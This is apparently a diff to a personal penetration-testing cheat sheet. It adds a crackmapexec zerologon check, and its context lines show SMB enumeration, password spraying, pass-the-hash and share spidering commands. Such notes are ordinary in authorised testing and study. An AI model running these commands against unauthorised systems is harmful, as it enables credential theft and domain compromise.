@@ -87,6 +87,7 @@ smbmap -d domain.local -u someuser -p somepassword -H 172.21.0.185 - try to put 
 crackmapexec smb --pass-pol x.x.x.z
 crackmapexec smb x.x.x.x --pass-pol -u '' -p ''
 crackmapexec smb x.x.x.x -u someuser -p somepassword --shares
+crackmapexec smb -u "" -p "" -M zerologon
 crackmapexec smb x.x.x.x -u users.txt -p somepassword -   this command wil take all users from files users.txt and try to login with somepassword
 crackmapexec smb x.x.x.x/24 -u 'userzz' -H HASHlaskhdsalhdlsahdlsadh134312!hash --local-auth
 crackmapexec smb ip -u 'guest' -p '' -M spider_plus after to parse the json type cat /tmp/cme_spuder_plus/ip.json |jq '. |map_values(keys)'
